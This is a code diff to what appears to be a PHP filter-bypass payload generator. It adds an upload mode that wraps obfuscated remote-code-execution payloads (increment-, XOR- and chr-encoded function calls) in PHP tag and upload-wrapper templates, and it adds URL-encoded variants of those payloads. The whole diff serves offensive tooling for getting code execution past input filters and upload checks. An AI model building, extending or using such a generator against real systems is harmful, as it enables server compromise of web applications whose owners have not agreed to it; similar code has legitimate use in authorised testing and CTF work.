@@ -13,6 +13,7 @@ class BypassOptions:
     port: int
     phpinfo: bool
     php_version: float = 7.0
+    upload: bool = False
 
 
 def _octal_encode(command: str):
@@ -116,6 +117,50 @@ def _build_proc_open_chr_payload(command: str):
     )
 
 
+def _to_php_expr(payload: str):
+    expr = payload.strip()
+    if not expr:
+        return None
+    if expr.endswith(";"):
+        expr = expr[:-1].strip()
+    if not expr:
+        return None
+    return expr
+
+
+def _render_upload_wrapper(template: str, payload: str, expr: str):
+    if "{expr}" in template:
+        if expr is None:
+            return None
+        return template.format(payload=payload, expr=expr)
+    return template.format(payload=payload, expr=expr)
+
+
+def _apply_upload_wrappers(payloads, php_version: float):
+    templates = list(bypass_data.SHORT_TAG_TEMPLATES)
+    templates.extend(bypass_data.UPLOAD_MODERN_WRAPPER_TEMPLATES)
+    if php_version < 7.0:
+        templates.extend(bypass_data.UPLOAD_LEGACY_WRAPPER_TEMPLATES)
+
+    wrapped = []
+    for payload in payloads:
+        if ";" not in payload and "(" not in payload and "$_" not in payload:
+            continue
+        expr = _to_php_expr(payload)
+        for template in templates:
+            rendered = _render_upload_wrapper(template, payload, expr)
+            if rendered:
+                wrapped.append(rendered)
+    return wrapped
+
+
+def _append_increment_with_url(payloads, raw_payload: str):
+    payloads.append(raw_payload)
+    encoded_payload = utils.url_encode(raw_payload)
+    if encoded_payload != raw_payload:
+        payloads.append(encoded_payload)
+
+
 def _generate_php_rce_payloads(command: str, php_version: float):
     payloads = []
     payloads.extend(_render_backtick_payloads(command))
@@ -137,7 +182,8 @@ def _generate_php_rce_payloads(command: str, php_version: float):
 
         inc_func_code = utils.generate_php_increment(func)
         if inc_func_code and xor_arg:
-            payloads.append(f"{inc_func_code};$_____({xor_arg});")
+            increment_payload = f"{inc_func_code};$_____({xor_arg});"
+            _append_increment_with_url(payloads, increment_payload)
 
         payloads.append(_build_chr_exec_payload(func, command))
 
@@ -235,7 +281,8 @@ def generate_candidates(options: BypassOptions):
         if target_cmd == "phpinfo":
             inc_code = utils.generate_php_increment("phpinfo")
             if inc_code:
-                payloads.append(f"{inc_code};$_____();")
+                increment_payload = f"{inc_code};$_____();"
+                _append_increment_with_url(payloads, increment_payload)
 
             if options.php_version >= 7.0:
                 not_code = utils.generate_php_not("phpinfo")
@@ -246,11 +293,8 @@ def generate_candidates(options: BypassOptions):
         else:
             payloads.extend(_generate_php_rce_payloads(target_cmd, options.php_version))
 
-    current_payloads = payloads.copy()
-    for payload in current_payloads:
-        if ";" in payload or "(" in payload or "$_" in payload:
-            for tag_tmpl in bypass_data.SHORT_TAG_TEMPLATES:
-                payloads.append(tag_tmpl.format(payload=payload))
+    if options.upload:
+        payloads.extend(_apply_upload_wrappers(payloads.copy(), options.php_version))
 
     base_payloads = payloads.copy()
     for payload in base_payloads:
